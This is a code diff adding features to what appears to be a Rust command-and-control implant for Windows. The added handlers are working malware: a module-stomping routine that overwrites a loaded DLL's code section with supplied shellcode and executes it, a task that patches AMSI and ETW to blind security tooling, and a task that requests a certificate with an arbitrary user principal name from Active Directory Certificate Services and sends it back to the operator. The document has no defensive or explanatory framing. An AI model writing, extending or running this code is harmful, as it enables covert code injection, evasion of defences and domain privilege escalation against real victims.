@@ -328,6 +328,76 @@ use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
 };
 
+// ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
+
+#[cfg(target_os = "windows")]
+unsafe fn shellcode_stomp(sc: &[u8], dll_hint: &str) -> String {
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPMODULE,
+    };
+    use windows_sys::Win32::System::Threading::CreateThread;
+
+    let auto_targets = ["xpsservices.dll","clbcatq.dll","msasn1.dll","wbemprox.dll","wbemcomn.dll"];
+
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
+    if snap == -1 { return "[-] shellcode_stomp: snapshot failed".into(); }
+
+    let mut me: MODULEENTRY32 = std::mem::zeroed();
+    me.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
+    let mut target_base: *mut u8 = std::ptr::null_mut();
+    let mut target_name = String::new();
+
+    if Module32First(snap, &mut me) != 0 {
+        loop {
+            let mod_name = String::from_utf8_lossy(
+                &me.szModule.iter().map(|&b| b as u8).take_while(|&b| b != 0).collect::<Vec<_>>()
+            ).to_lowercase();
+            let pick = if !dll_hint.is_empty() {
+                mod_name == dll_hint.to_lowercase()
+            } else {
+                auto_targets.iter().any(|&t| t == mod_name.as_str())
+            };
+            if pick { target_base = me.modBaseAddr; target_name = mod_name; break; }
+            if Module32Next(snap, &mut me) == 0 { break; }
+        }
+    }
+    windows_sys::Win32::Foundation::CloseHandle(snap);
+    if target_base.is_null() { return "[-] shellcode_stomp: target DLL not loaded".into(); }
+
+    // Parse PE to find .text section
+    if *target_base != b'M' { return "[-] shellcode_stomp: MZ wiped, can't parse PE".into(); }
+    let e_lfanew = *(target_base.add(0x3C) as *const u32);
+    let nt = target_base.add(e_lfanew as usize);
+    let num_secs = *(nt.add(6)  as *const u16);
+    let opt_sz   = *(nt.add(20) as *const u16);
+    let mut sec  = nt.add(24 + opt_sz as usize);
+    let (mut text_rva, mut text_sz) = (0u32, 0u32);
+    for _ in 0..num_secs {
+        let name = std::slice::from_raw_parts(sec, 5);
+        if name == b".text" {
+            text_sz  = *(sec.add(16) as *const u32);
+            text_rva = *(sec.add(12) as *const u32);
+            break;
+        }
+        sec = sec.add(40);
+    }
+    if text_sz == 0 { return format!("[-] shellcode_stomp: no .text in {}", target_name); }
+
+    let write_addr = target_base.add(text_rva as usize);
+    let write_len  = sc.len().min(text_sz as usize);
+    let mut old = 0u32;
+    VirtualProtect(write_addr as *const _, write_len, PAGE_READWRITE, &mut old);
+    std::ptr::copy_nonoverlapping(sc.as_ptr(), write_addr, write_len);
+    VirtualProtect(write_addr as *const _, write_len, PAGE_EXECUTE_READ, &mut old);
+
+    let ht = CreateThread(std::ptr::null(), 0,
+        Some(std::mem::transmute::<*mut u8, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(write_addr)),
+        std::ptr::null_mut(), 0, std::ptr::null_mut());
+    if ht == 0 { return format!("[-] shellcode_stomp: CreateThread failed (err {})", GetLastError()); }
+    CloseHandle(ht);
+    format!("[+] shellcode_stomp: {}+0x{:X} sc={} B → executing", target_name, text_rva, sc.len())
+}
+
 // ── In-process shellcode execution (STAGE2) ──────────────────────────────────
 
 #[cfg(target_os = "windows")]
@@ -1079,6 +1149,15 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &r, "");
         }
         #[cfg(target_os = "windows")]
+        "SHELLCODE_STOMP" => {
+            if task.payload.is_empty() { t.send_result(task.id, "", "SHELLCODE_STOMP: no shellcode payload"); return; }
+            let dll_hint = serde_json::from_str::<serde_json::Value>(&task.args)
+                .ok().and_then(|v| v.get("dll").and_then(|d| d.as_str()).map(str::to_owned))
+                .unwrap_or_default();
+            let r = unsafe { shellcode_stomp(&task.payload, &dll_hint) };
+            t.send_result(task.id, &r, "");
+        }
+        #[cfg(target_os = "windows")]
         "UDRL" => {
             if task.payload.is_empty() { t.send_result(task.id, "", "UDRL: no shellcode payload"); return; }
             let r = unsafe { phantom_load(&task.payload) };
@@ -1296,6 +1375,11 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 }
             };
             t.send_result(task.id, &r, "");
+        }
+        #[cfg(target_os = "windows")]
+        "AMSI_BYPASS" => {
+            crate::evasion::patch_amsi();
+            t.send_result(task.id, "[+] AMSI/ETW re-patched", "");
         }
         #[cfg(target_os = "windows")]
         "WIPE_MZ" => {
@@ -1701,6 +1785,37 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "COMPUTERNAME" => {
             let v = std::env::var("COMPUTERNAME").unwrap_or_default();
             t.send_result(task.id, &v, "");
+        }
+
+        "ADCS_REQUEST" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let ca   = j["ca"].as_str().unwrap_or("");
+            let tmpl = j["template"].as_str().unwrap_or("");
+            let subj = j["subject"].as_str().unwrap_or("CN=user");
+            let san  = j["san"].as_str().unwrap_or("");
+            let out_arg = j["out"].as_str().unwrap_or("");
+            let pid  = std::process::id();
+            let inf  = format!(r"C:\Users\Public\adcs_{}.inf", pid);
+            let csr  = format!(r"C:\Users\Public\adcs_{}.csr", pid);
+            let out_path = if out_arg.is_empty() {
+                format!(r"C:\Users\Public\adcs_{}.cer", pid)
+            } else {
+                out_arg.to_string()
+            };
+            let san_line = if san.is_empty() { String::new() } else { format!("\r\nSAN=upn={}", san) };
+            let inf_content = format!(
+                "[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"{}\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate={}{}\r\n",
+                subj, tmpl, san_line
+            );
+            let _ = std::fs::write(&inf, inf_content.as_bytes());
+            let o1 = shell(&format!("certreq -new \"{}\" \"{}\" 2>&1", inf, csr));
+            let o2 = shell(&format!("certreq -submit -config \"{}\" \"{}\" \"{}\" 2>&1", ca, csr, out_path));
+            let cert_b64 = std::fs::read(&out_path)
+                .map(|b| format!("\ncert_b64={}", STANDARD.encode(&b)))
+                .unwrap_or_default();
+            let _ = std::fs::remove_file(&inf);
+            let _ = std::fs::remove_file(&csr);
+            t.send_result(task.id, &format!("{}\n{}{}", o1, o2, cert_b64), "");
         }
 
         // ── Agent state ───────────────────────────────────────────────────────
